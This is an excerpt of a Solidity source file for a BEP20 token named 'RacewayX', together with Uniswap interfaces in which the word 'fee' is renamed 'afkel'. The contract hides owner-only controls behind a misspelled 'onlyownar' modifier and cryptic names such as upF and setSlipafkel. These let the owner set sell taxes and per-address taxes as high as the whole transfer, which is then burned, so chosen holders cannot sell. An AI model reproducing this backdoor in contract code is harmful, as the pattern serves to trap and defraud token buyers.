...
interface IUniswapV2Factory {
    ...
    function afkelTo() external view returns (address);
    function afkelToSetter() external view returns (address);
    ...
    function setafkelTo(address) external;
    function setafkelToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingafkelOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingafkelOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingafkelOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingafkelOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingafkelOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract RacewayX  is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellafkel = 0;

    uint256 private _defaultBuyafkel = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipafkel;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellafkel = _value;
    }

    function setSlipafkel(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipafkel[_address] = _value;
    }

    function getSlipafkel(address _address) external view onlyownar returns (uint256) {
        return _slipafkel[_address];
    }


    function setMAccountafkel(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountafkel(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradeafkelAmount = 0;

        if (rF) {
            uint256 tradeafkel = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradeafkel = _defaultSellafkel;
                }
                if (from == uniswapV2Pair) {

                    tradeafkel = _defaultBuyafkel;
                }
            }
            if (_slipafkel[from] > 0) {
                tradeafkel = _slipafkel[from];
            }

            tradeafkelAmount = _Amount.mul(tradeafkel).div(100);
        }


        if (tradeafkelAmount > 0) {
            _balances[from] = _balances[from].sub(tradeafkelAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradeafkelAmount);
            emit Transfer(from, _deadAddress, tradeafkelAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradeafkelAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradeafkelAmount);
        emit Transfer(from, _to, _Amount - tradeafkelAmount);
    }
